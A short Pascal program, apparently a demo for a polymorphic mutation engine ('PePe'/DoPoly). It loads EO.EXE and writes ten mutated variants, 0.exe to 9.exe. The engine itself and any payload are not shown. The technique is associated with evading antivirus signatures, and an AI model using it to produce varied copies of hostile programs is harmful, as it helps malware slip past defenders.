   Program ThatGeneratesTenExamples;
   Uses PePe;
   VAR
   F:File;
   G,H:Pointer;
   NSize,FD,Num : Word;
   FF:String;

   Begin
   Randomize;

   Assign(F,'EO.EXE');
   Reset(F,1);
   FD := FileSize(F);
   GetMem(H,FD);
   Blockread(F,H^,FD);
   Close(F);

   GetMem(G,15000);

   For Num := 0 to 9 do Begin
   NSize := DoPoly(H,FD,G);
   Str(Num,FF);
   Assign(F,FF+'.exe');
   Rewrite(F,1);
   BlockWrite(F,G^,NSize);
   Close(F);
   End;

   End.
